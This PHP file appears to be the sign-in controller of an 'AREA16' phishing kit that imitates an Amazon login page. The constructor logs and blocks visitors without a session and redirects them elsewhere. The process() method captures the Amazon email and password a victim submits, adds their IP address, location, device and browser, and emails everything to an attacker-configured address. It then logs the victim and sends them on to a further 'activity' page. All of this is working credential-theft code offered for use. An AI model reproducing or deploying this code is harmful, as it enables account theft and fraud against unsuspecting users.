<?php 
defined("ACCESS") or die('Konz');

class Sign 
{
	public $pc;
	private $_LICENSE = FCPATH . "AREA16/system/private/license.ini";
	private $_CONFIG = FCPATH. "AREA16/system/private/setting.json";

	public function __construct()
	{
		$this->pc = new Pc();
		$_ini_file = parse_ini_file($this->_LICENSE);
		$this->license = new license($_ini_file);

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 1)) {

			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Access Page Without Session|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{		
		if ($this->pc->is_mobile) {
			echo view('sign/index-mobile');
		} else {
			echo view('sign/index-desktop');
		}
	}

	public function process()
	{
		if (isset($_POST['emailLogin']) and isset($_POST['passwordLogin'])) {
			$_SESSION['emailLogin'] 	= trim($_POST['emailLogin']);
			$_SESSION['passwordLogin']	= trim($_POST['passwordLogin']);

			$email    = trim($_POST['emailLogin']);
			$password = trim($_POST['passwordLogin']);

			$message = 
"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: アマゾン - エリア16チームによって作成されました❤️ ::</span></strong>

<strong>:: Amazon Account ::</strong>
			
# Email address : {$email}
# Password      : {$password}
# Check format  : {$email}|{$password}

<strong>:: Visitor Details ::</strong>

# Time &amp; Date   : "._date()."  
# Device        : {$this->pc->platform}
# Browser       : {$this->pc->browser}
# Country 	: {$_SESSION['country']}
# State         : {$_SESSION['regionName']}
# City          : {$_SESSION['city']}
# Ip address    : {$this->pc->ip_address}
# User agent    : {$this->pc->agent}

</pre>
</fieldset>
</pre>";

			$subject = "Account :: [ {$_SESSION['country']} - {$this->pc->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: AREA16 <admin@area16.sg>";

			if (_config('get_account') == 'on') {
				@mail(_config('result'), $subject, $message, $headers);
			}

			write(FCPATH . 'AREA16/system/stats/log_account.txt', 'a', "{$this->pc->ip_address}\r\n");
			$this->license->create_logs("Human|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Submit Amazon account|"._time()."", "ACCOUNT");

			$_SESSION['access'] = 2;
			redirect(base_url() . 'activity?_ts='. md5(time()));
		}
	}
}